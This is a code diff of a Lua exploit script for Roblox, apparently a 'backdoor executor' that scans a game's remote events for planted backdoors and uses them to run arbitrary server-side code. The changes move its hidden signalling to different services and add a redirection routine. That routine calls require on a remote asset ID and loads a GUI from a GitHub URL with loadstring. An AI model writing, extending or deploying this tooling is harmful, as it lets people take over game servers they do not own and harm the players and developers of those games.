@@ -1,12 +1,13 @@
 -- services
 local httpService = game:GetService("HttpService")
 local insertService = game:GetService("InsertService")
-local jointsService = game:GetService("JointsService")
+local logService = game:GetService("LogService")
+local runService = game:GetService("RunService")
 local starterGui = game:GetService("StarterGui")
 -- variables
 local config
 local execGuiAPI
-local remoteRedirectionSucceed = false
+local remoteRedirectionInitialized = false
 local debugSource = [[
 local stdout = table.create(512)
 local execSucc, result do
@@ -23,7 +24,7 @@ local execSucc, result do
 end
 
 local stdObj = Instance.new("BoolValue")
-stdObj.Name, stdObj.Value, stdObj.Parent = "%s", execSucc, game:GetService("JointsService")
+stdObj.Name, stdObj.Value, stdObj.Parent = "%s", execSucc, game:GetService("InsertService")
 
 if not execSucc then
 	stdObj:SetAttribute("stderr", result)
@@ -33,7 +34,7 @@ if #stdout > 0 then
 end
 task.delay(1, stdObj.Destroy, stdObj)
 ]]
-local testSource = [[local _val=Instance.new("StringValue");_val.Name,_val.Parent,_val.Value="%s",game:GetService("JointsService"),"%s";task.delay(5, _val.Destroy, _val)]]
+local testSource = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
 local configRaw = (
 	if isfile("bexe-config.lua") then
@@ -96,21 +97,23 @@ local function sendNotification(text)
 end
 
 local function pathToInstance(strPath)
+	if not strPath then return end
 	local pathSplit = string.split(strPath, ".")
 	local result = game
 
 	for _, pathName in pathSplit do
 		if not result then return end
-		result = result:FindFirstChild(pathName) or nil
+		result = result:WaitForChild(pathName, 1) -- yielding go brr
 	end
 	return result
 end
 
-local function generateRandString(lenght)
+local function generateRandString(lenght, lettersOnly)
 	local result = ""
+	local strTotalLenght = (if lettersOnly then 52 else #stringList)
 
 	for _ = 1, lenght do
-		local randInteger = math.random(1, #stringList)
+		local randInteger = math.random(1, strTotalLenght)
 		result ..= string.sub(stringList, randInteger, randInteger)
 	end
 	return result
@@ -127,6 +130,11 @@ local function notSameRandNumber(min, max, ...)
 		else
 			notSameRandNumber(min, max, ...)
 	)
+end
+
+local function waitUntil(waitTime, condition)
+	local startTime = os.clock()
+	repeat runService.Heartbeat:Wait() until condition() or (os.clock() - startTime) > waitTime
 end
 
 local function isRemoteAllowed(object)
@@ -221,7 +229,6 @@ end
 local function execScript(source, _sourceName, noRedirectOutput)
 	if not remoteInfo.foundBackdoor then return end
 	source = applyMacros(source)
-	source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 	local remoteFunc = getRemoteFunc(remoteInfo.instance)
 
 	if (config.redirectOutput and not noRedirectOutput) then
@@ -229,7 +236,7 @@ local function execScript(source, _sourceName, noRedirectOutput)
 		source = string.format(debugSource, source, nonce)
 
 		local connection
-		connection = jointsService.ChildAdded:Connect(function(object)
+		connection = insertService.ChildAdded:Connect(function(object)
 			if object.Name == nonce then connection:Disconnect()
 				local rawStdout = object:GetAttribute("stdout")
 				local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
@@ -259,7 +266,8 @@ local function execScript(source, _sourceName, noRedirectOutput)
 		task.delay(60, connection.Disconnect, connection)
 	end
 
-	if (config.redirectRemote and remoteRedirectionSucceed) then
+	source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
+	if (config.redirectRemote and remoteRedirectionInitialized) then
 		remoteInfo.args = applyRedirectedRemoteSecurity(source)
 	else
 		remoteInfo.args[remoteInfo.argSrcIndex] = source
@@ -276,6 +284,48 @@ local function initializeRemoteInfo(params)
 	end
 end
 
+local function initRemoteRedirection()
+	if not (config.redirectRemote and not remoteRedirectionInitialized) then return end
+	local redirectedRemotePath = insertService:GetAttribute("bexeremotepath")
+
+	if not redirectedRemotePath then
+		execScript("require(11906423264)(%userid%)", nil, true)
+		-- we need to improvise until :WaitForAttribute is added
+		waitUntil(5, function() return insertService:GetAttribute("bexeremotepath") end)
+		redirectedRemotePath = insertService:GetAttribute("bexeremotepath")
+	end
+
+	if not redirectedRemotePath then return warn(msgOutputs.failedRemoteRedirection) end
+	local redirectedRemote = pathToInstance(redirectedRemotePath)
+
+	if redirectedRemote and
+		redirectedRemote:IsA("RemoteEvent") and
+		redirectedRemote:GetAttribute("bexeremote")
+	then
+		remoteRedirectionInitialized = true
+
+		remoteInfo.instance = redirectedRemote
+		remoteInfo.argSrcIndex = 1
+		remoteInfo.args = {"source"}
+
+		insertService:GetAttributeChangedSignal("bexeremotepath"):Connect(function()
+			local newPath = insertService:GetAttribute("bexeremotepath")
+			if not newPath then return end
+			local newRemote = pathToInstance(newPath)
+
+			if newRemote and
+				newRemote:IsA("RemoteEvent") and
+				newRemote:GetAttribute("bexeremote")
+			then
+				remoteInfo.instance = newRemote
+			end
+		end)
+	else
+		warn(msgOutputs.failedRemoteRedirection)
+	end
+	return remoteInfo.instance
+end
+
 local function onAttached(remoteObj, params)
 	if not remoteObj or remoteInfo.foundBackdoor then return end
 	getgenv().__BEXELUAATTACHED = true
@@ -285,45 +335,7 @@ local function onAttached(remoteObj, params)
 		["instance"] = remoteObj,
 	})
 
-	if config.redirectRemote then
-		local redirectionHandler = insertService:FindFirstChildWhichIsA("StringValue")
-
-		if not redirectionHandler or not redirectionHandler:GetAttribute("bexehandler") then
-			execScript("require(11906423264)(%userid%)", nil, true)
-			redirectionHandler = insertService:WaitForChild("bexe-handler", 5)
-		end
-
-		if redirectionHandler then
-			local redirectedEvent = pathToInstance(redirectionHandler.Value)
-
-			if redirectedEvent and
-				redirectedEvent:IsA("RemoteEvent") and
-				redirectedEvent:GetAttribute("bexeremote")
-			then
-				remoteRedirectionSucceed = true
-
-				remoteInfo.instance = redirectedEvent
-				remoteInfo.argSrcIndex = 1
-				remoteInfo.args = {"source"}
-
-				redirectionHandler:GetPropertyChangedSignal("Value"):Connect(function()
-					local newEvent = pathToInstance(redirectionHandler.Value)
-
-					if newEvent and
-						newEvent:IsA("RemoteEvent") and
-						newEvent:GetAttribute("bexeremote")
-					then
-						remoteInfo.instance = newEvent
-					end
-				end)
-			else
-				warn(msgOutputs.failedRemoteRedirection)
-			end
-		else
-			warn(msgOutputs.failedRemoteRedirection)
-		end
-	end
-
+	initRemoteRedirection()
 	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
 		customMainTabText = msgOutputs.mainTabText,
 		customExecution = true,
@@ -336,15 +348,12 @@ end
 
 local function findBackdoors()
 	if remoteInfo.foundBackdoor then return end
-	local nonce = generateRandString(32)
+	local nonce = generateRandString(32, true)
 	local connection
-	connection = jointsService.ChildAdded:Connect(function(object)
-		if object:IsA("StringValue") and
-			object.Name == nonce and
-			object.Value ~= ""
-		then connection:Disconnect()
-			task.spawn(onAttached, pathToInstance(object.Value))
-		end
+	connection = logService.AttributeChanged:Connect(function(attributeName)
+		if attributeName ~= nonce then return end
+		connection:Disconnect()
+		task.spawn(onAttached, pathToInstance(logService:GetAttribute(nonce)))
 	end)
 
 	for _, object in getRemotes() do task.wait()
@@ -356,7 +365,8 @@ local function findBackdoors()
 		table.insert(scannedRemotes, objectPath)
 	end
 	table.clear(scannedRemotes)
-	connection:Disconnect()
+	waitUntil(2.5, function() return not connection.Connected end)
+	task.defer(connection.Disconnect, connection)
 end
 -- main
 do -- "initialization"?
@@ -401,11 +411,19 @@ do -- backdoor finding
 			else
 				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
 			end
-		end
-		if (not placeCacheData or not remoteInfo.foundBackdoor) then -- scan first
-			local startTime = os.clock()
-			findBackdoors()
-			print(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
+		else
+			if insertService:GetAttribute("bexeremotepath") then
+				local redirectedRemote = initRemoteRedirection()
+
+				if redirectedRemote then
+					onAttached(redirectedRemote) -- remote redirection is initialized here
+				end
+			end
+			if (not remoteInfo.foundBackdoor) then -- we scan
+				local startTime = os.clock()
+				findBackdoors()
+				print(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
+			end
 		end
 
 		if not remoteInfo.foundBackdoor then -- if no backdoor found
